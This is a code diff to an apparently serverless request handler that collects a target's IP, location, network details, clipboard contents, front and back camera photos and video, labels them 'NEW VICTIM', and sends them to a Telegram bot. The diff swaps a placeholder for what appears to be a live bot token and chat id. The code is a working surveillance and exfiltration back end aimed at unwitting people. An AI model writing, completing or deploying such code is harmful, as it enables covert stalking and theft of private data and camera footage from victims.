@@ -14,26 +14,26 @@ async function handle(request) {
   const vid = fd.get('video');
 
   const txt = `🎯 NEW VICTIM\nSlug: ${token}\nIP: ${ip}\nLoc: ${loc}\nNet: ${net}\nClipboard: ${clip}`;
-  await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage`, {
+  await fetch(`https://api.telegram.org/bot8509183384:AAHEAk49_9bAHt44axRCAxFE1-CIqyiPuVo/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: '6671784926', text: txt })
   });
 
   if (front) {
-    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendPhoto`, {
+    await fetch(`https://api.telegram.org/bot8509183384:AAHEAk49_9bAHt44axRCAxFE1-CIqyiPuVo/sendPhoto`, {
       method: 'POST',
       body: form(front, 'photo', token + '_front.jpg')
     });
   }
   if (back) {
-    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendPhoto`, {
+    await fetch(`https://api.telegram.org/bot8509183384:AAHEAk49_9bAHt44axRCAxFE1-CIqyiPuVo/sendPhoto`, {
       method: 'POST',
       body: form(back, 'photo', token + '_back.jpg')
     });
   }
   if (vid) {
-    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendVideo`, {
+    await fetch(`https://api.telegram.org/bot8509183384:AAHEAk49_9bAHt44axRCAxFE1-CIqyiPuVo/sendVideo`, {
       method: 'POST',
       body: form(vid, 'video', token + '.webm')
     });
